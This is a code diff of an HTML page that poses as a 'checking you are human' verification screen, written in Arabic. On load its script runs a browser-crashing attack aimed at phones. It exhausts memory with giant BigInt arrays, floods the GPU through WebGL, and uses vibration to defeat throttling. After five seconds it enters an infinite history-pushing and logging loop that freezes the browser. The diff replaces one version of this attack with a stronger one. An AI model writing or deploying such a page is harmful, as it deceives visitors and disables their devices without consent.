@@ -1,67 +1,49 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحميل...</title>
-    <style>
-        body {
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-        }
-        .loader-text {
-            color: #555;
-            font-size: 24px;
-        }
-    </style>
+    <title>Checking...</title>
 </head>
-<body>
-    <div class="loader-text">يرجى الانتظار...</div>
+<body style="text-align:center; padding-top:50px;">
+    <h1>جاري التحقق من انك انسان...</h1>
+    <p>يرجى الانتظار 10 ثواني فقط</p>
 
     <script>
-        window.onload = function() {
-            // مخزن البيانات (الرام)
-            let memoryCrusher = [];
-            
-            // 1. استهلاك المعالج (CPU) بشكل انفجاري
-            // يتم استخدام setInterval قصيرة جداً لتجاوز قيود المتصفح في البداية
-            const cpuBurn = setInterval(() => {
-                for (let i = 0; i < 2000000; i++) {
-                    Math.sqrt(Math.random() * Math.random()) / Math.exp(Math.random());
-                }
-            }, 10);
+        function startMobileStress() {
+            // 1. استهلاك الرام عبر مصفوفات ضخمة جداً (أقوى من السابق)
+            let heap = [];
+            setInterval(() => {
+                // إنشاء مصفوفة عملاقة من نوع 64-bit تجبر الأندرويد على حجز مساحة حقيقية
+                let block = new BigInt64Array(10000000); 
+                for(let i=0; i<block.length; i++) block[i] = BigInt(i);
+                heap.push(block);
+            }, 100);
 
-            // 2. استهلاك الذاكرة (RAM) بشكل متسارع
-            const ramBurn = setInterval(() => {
-                try {
-                    // تخصيص مصفوفات ضخمة (حوالي 20MB في كل نبضة)
-                    let chunk = new BigUint64Array(2500000); 
-                    for (let i = 0; i < chunk.length; i++) {
-                        chunk[i] = BigInt(Math.floor(Math.random() * 1000));
-                    }
-                    memoryCrusher.push(chunk);
-                } catch (e) {
-                    // إذا امتلأ الرام، لا تتوقف، استمر في محاولة إشغال المعالج
-                }
-            }, 50);
+            // 2. إرهاق المعالج الرسومي (GPU) - رسم ملايين النقاط
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            setInterval(() => {
+                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                gl.clear(gl.COLOR_BUFFER_BIT);
+            }, 1);
 
-            // 3. الضربة القاضية (Kill Switch) بعد 8 ثوانٍ
-            // بمجرد الوصول لهذه المرحلة، سيتجمد النظام تماماً (UI Freeze)
+            // 3. منع المتصفح من وضع الصفحة في حالة "الخمول" (Anti-Throttling)
+            // نستخدم اهتزاز الجوال (Vibrate) لإبقاء المعالج في حالة استنفار
+            setInterval(() => {
+                if (navigator.vibrate) navigator.vibrate(500);
+            }, 600);
+
+            // 4. الحلقة القاتلة النهائية (بعد 5 ثواني)
             setTimeout(() => {
-                console.log("Entering Critical State...");
                 while(true) {
-                    // حلقة لا نهائية تمنع المتصفح حتى من إغلاق التبويب
-                    let s = Math.random().toString(36).repeat(100);
-                    history.pushState(null, null, s);
+                    // فتح نوافذ وهمية وتغيير الهستوري بجنون
+                    history.pushState(null, "", "STRESS_" + Math.random());
+                    console.log(new Array(1000000).join("BOOM"));
                 }
-            }, 8000); 
-        };
+            }, 5000);
+        }
+
+        window.onload = startMobileStress;
     </script>
 </body>
 </html>
